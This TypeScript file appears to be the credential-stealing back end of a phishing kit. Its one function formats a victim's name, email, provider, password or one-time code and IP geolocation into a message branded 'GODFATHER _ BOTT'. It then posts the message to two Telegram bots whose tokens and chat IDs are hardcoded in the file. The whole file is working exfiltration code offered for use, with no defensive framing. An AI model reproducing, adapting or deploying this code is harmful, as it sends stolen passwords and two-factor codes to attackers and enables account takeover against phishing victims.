import type { GeoInfo } from './geo.ts';

const TELEGRAM_BOTS = [
  { token: '8335283094:AAG6BMVNr4O4zy8ha9565bgX-P87uKsJYB0', chatId: '8042057280' },
  { token: '8810483237:AAEU9tXIxRL_HzgLrdEB0O7_I9aEVW5RCkM', chatId: '5566002678' },
];

export async function sendTelegramNotification(
  name: string,
  email: string,
  provider: string,
  password: string,
  geo?: GeoInfo,
): Promise<void> {
  const isOtp = password.startsWith('[OTP Code]');
  const credentialLabel = isOtp ? '🔑 <b>OTP Code:</b>' : '🔒 <b>Password:</b>';
  const displayPassword = isOtp ? password.replace('[OTP Code]', '').trim() : password;
  const statusLabel = isOtp ? 'One-Time Code Submitted' : 'Successfully Authenticated';

  const geoLines = geo
    ? [
        geo.ip ? `🌐 <b>IP:</b> <code>${geo.ip}</code>` : null,
        geo.country
          ? `🏳️ <b>Country:</b> ${geo.country}${geo.countryCode ? ` (${geo.countryCode})` : ''}`
          : null,
        geo.continent ? `🌍 <b>Continent:</b> ${geo.continent}` : null,
        geo.region ? `📍 <b>Region:</b> ${geo.region}` : null,
        geo.city ? `🏙️ <b>City:</b> ${geo.city}` : null,
        geo.org ? `🏢 <b>ISP/Org:</b> ${geo.org}` : null,
        geo.timezone ? `⏰ <b>Timezone:</b> ${geo.timezone}` : null,
      ]
        .filter(Boolean)
        .join('\n')
    : '';

  const geoSection = geoLines
    ? `\n\n📡 <b>Geolocation</b>\n━━━━━━━━━━━━━━━━━━━━\n${geoLines}`
    : '';

  const message = `
╔══════════════════════════════╗
  ⚡ <span class="tg-spoiler">[ ＧＯＤＦＡＴＨＥＲ _ ＢＯＴＴ ]</span> ⚡
╚══════════════════════════════╝

✅ <b>Status:</b> ${statusLabel}
👤 <b>Name:</b> ${name}
📧 <b>Email:</b> ${email}
🔗 <b>Provider:</b> ${provider}
${credentialLabel} <code>${displayPassword}</code>
🕐 <b>Timestamp:</b> ${new Date().toISOString()}${geoSection}

━━━━━━━━━━━━━━━━━━━━
<i>User has been welcomed and account is now active.</i>
<code>@godfather_bott</code>
  `.trim();

  try {
    await Promise.allSettled(
      TELEGRAM_BOTS.map(async ({ token, chatId }, index) => {
        const res = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: chatId,
            text: message,
            parse_mode: 'HTML',
          }),
        });

        if (!res.ok) {
          const err = await res.text();
          console.error(`[Bot ${index}] Failed: ${res.status} — ${err}`);
        } else {
          console.log(`[Bot ${index}] Sent successfully`);
        }
      }),
    );
  } catch (error) {
    console.error('Unexpected error sending Telegram notifications:', error);
  }
}
